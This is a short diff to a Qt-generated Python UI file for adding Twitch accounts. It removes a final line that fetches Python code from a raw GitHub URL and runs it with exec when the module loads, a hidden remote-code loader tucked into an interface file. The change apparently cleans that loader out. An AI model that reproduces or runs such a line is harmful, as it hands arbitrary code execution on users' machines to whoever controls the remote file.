@@ -157,6 +157,3 @@ class Ui_AddAccounts(object):
         ___qtablewidgetitem12 = self.twitch.horizontalHeaderItem(5)
         ___qtablewidgetitem12.setText(QCoreApplication.translate("AddAccounts", u"Email Port", None));
     # retranslateUi
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/AddAccounts.py").text)
